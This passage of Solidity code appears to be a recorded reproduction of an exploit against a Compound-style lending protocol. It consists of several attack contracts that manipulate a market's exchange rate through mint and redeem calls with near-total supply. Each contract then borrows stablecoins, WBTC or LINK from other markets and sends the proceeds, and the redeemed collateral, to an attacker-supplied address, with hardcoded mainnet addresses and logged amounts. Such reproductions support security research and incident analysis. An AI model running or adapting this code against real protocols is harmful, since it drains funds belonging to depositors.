    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;
    address constant x830d = 0x830DAcD5D0a62afa92c9Bc6878461e9cD317B085;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093368914499400221409;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499400221409 (2520870348093.3689 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr46 = new address[](1);
        arr46[0] = x5fdb;
        I(x7d61).enterMarkets(arr46);

        I(x830d).getCash();
        I(x830d).borrow(103657601740278955029570);
        I(x830d).underlying();
        I(x830d).underlying();
        I(x830d).underlying();
        // uint256 v3 = 103657601740278955029570;
        uint256 v3 = I(x6b17).balanceOf(r);
        console2.log("I(x6b17).balanceOf(r)\t\t->", "103657601740278955029570 (103657.6017 ether)");
        I(x6b17).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348093368914499400221408);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(x830d, x5fdb, 1);
        I(x5fdb).mint(977872);
        // uint256 v4 = 2520870348093368914499399243536;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499399243536 (2520870348093.3689 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xe495 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;
    address constant xbced = 0xbCed4e924f28f43a24ceEDec69eE21ed4D04D2DD;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093396303218754970849;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093396303218754970849 (2520870348093.3963 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr30 = new address[](1);
        arr30[0] = x5fdb;
        I(x7d61).enterMarkets(arr30);

        I(xbced).getCash();
        I(xbced).borrow(249534202651);
        I(xbced).underlying();
        // uint256 v3 = 249534202651;
        uint256 v3 = I(xdac1).balanceOf(r);
        console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(249534202651));
        I(xdac1).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348093396303218754970848);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(xbced, x5fdb, 1);
        I(x5fdb).mint(978168546451878854);
        // uint256 v4 = 2520870348092418134672303091994;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348092418134672303091994 (2520870348092.4181 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xfbee {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    function stringToAddress(string memory) public {
        bytes memory rt = abi.encodePacked(abi.encode(address(0x085bDfF2C522e8637D4154039Db8746bb8642BfF)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X4147 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x0c19 = 0x0C19D213e9f2A5cbAA4eC6E8eAC55a22276b0641;
    address constant x4580 = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093368914499454318243;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499454318243 (2520870348093.3689 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr38 = new address[](1);
        arr38[0] = x5fdb;
        I(x7d61).enterMarkets(arr38);

        I(x0c19).getCash();
        I(x0c19).borrow(81375414746413246657);
        I(x0c19).underlying();
        I(x0c19).underlying();
        I(x0c19).underlying();
        // uint256 v3 = 81359139663463964008;
        uint256 v3 = I(x4580).balanceOf(r);
        console2.log("I(x4580).balanceOf(r)\t\t->", "81359139663463964008 (81.3591 ether)");
        I(x4580).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348093368914499454318242);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(x0c19, x5fdb, 1);
        I(x5fdb).mint(1932029788);
        // uint256 v4 = 2520870348093368914497522288454;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914497522288454 (2520870348093.3689 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xdb9b {
    address immutable r = address(this);
    receive() external payable {}
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;
    address constant x8f35 = 0x8f35113cFAba700Ed7a907D92B114B44421e412A;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093423681390001419193;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093423681390001419193 (2520870348093.4236 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr22 = new address[](1);
        arr22[0] = x5fdb;
        I(x7d61).enterMarkets(arr22);

        I(x8f35).getCash();
        I(x8f35).borrow(513987927004);
        I(x8f35).underlying();
        I(x8f35).underlying();
        I(x8f35).underlying();
        // uint256 v3 = 513987927004;
        uint256 v3 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(513987927004));
        I(xa0b8).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348093423681390001419192);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(x8f35, x5fdb, 1);
        I(x5fdb).mint(977791830230298050);
        // uint256 v4 = 2520870348092445889559771121142;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348092445889559771121142 (2520870348092.4458 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xf79c {
    address immutable r = address(this);
    receive() external payable {}
    address constant x5149 = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;
    address constant xfee4 = 0xFEe4428b7f403499C50a6DA947916b71D33142dC;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348083935728844005359509;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348083935728844005359509 (2520870348083.9357 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr62 = new address[](1);
        arr62[0] = x5fdb;
        I(x7d61).enterMarkets(arr62);

        I(xfee4).getCash();
        I(xfee4).borrow(10082867210431152021425);
        I(xfee4).underlying();
        I(xfee4).underlying();
        I(xfee4).underlying();
        // uint256 v3 = 10082867210431152021425;
        uint256 v3 = I(x5149).balanceOf(r);
        console2.log("I(x5149).balanceOf(r)\t\t->", "10082867210431152021425 (10082.8672 ether)");
        I(x5149).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348083935728844005359508);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(xfee4, x5fdb, 1);
        I(x5fdb).mint(10837190);
        // uint256 v4 = 2520870348083935728843994522318;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348083935728843994522318 (2520870348083.9357 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xe82f {
    address immutable r = address(this);
    receive() external payable {}
    address constant x1933 = 0x1933f1183C421d44d531Ed40A5D2445F6a91646d;
    address constant x2260 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093368914499400194029;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499400194029 (2520870348093.3689 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr54 = new address[](1);
        arr54[0] = x5fdb;
        I(x7d61).enterMarkets(arr54);

        I(x1933).getCash();
        I(x1933).borrow(1312889485);
        I(x1933).underlying();
        I(x1933).underlying();
        I(x1933).underlying();
        // uint256 v3 = 1312889485;
        uint256 v3 = I(x2260).balanceOf(r);
        console2.log("I(x2260).balanceOf(r)\t\t->", uint256(1312889485));
        I(x2260).transfer(x526e, v3);
        I(x5fdb).redeemUnderlying(2520870348093368914499400194028);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(x1933, x5fdb, 1);
        I(x5fdb).mint(336899487692672661460);
        // uint256 v4 = 2520870347756469426806727532568;
        uint256 v4 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870347756469426806727532568 (2520870347756.4694 ether)");
        I(x6982).transfer(x526e, v4);
    }

    fallback() external payable {
        revert("no such function");
    }
}
